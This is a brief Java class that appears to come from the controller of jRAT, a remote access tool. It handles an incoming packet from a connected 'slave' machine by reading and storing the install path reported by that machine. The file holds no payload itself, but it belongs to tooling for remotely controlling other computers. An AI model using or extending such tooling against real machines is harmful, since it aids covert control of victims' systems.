package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;

import java.io.DataInputStream;


public class Packet10InitInstallPath extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String line = slave.readLine();
		slave.setServerPath(line);
	}

}
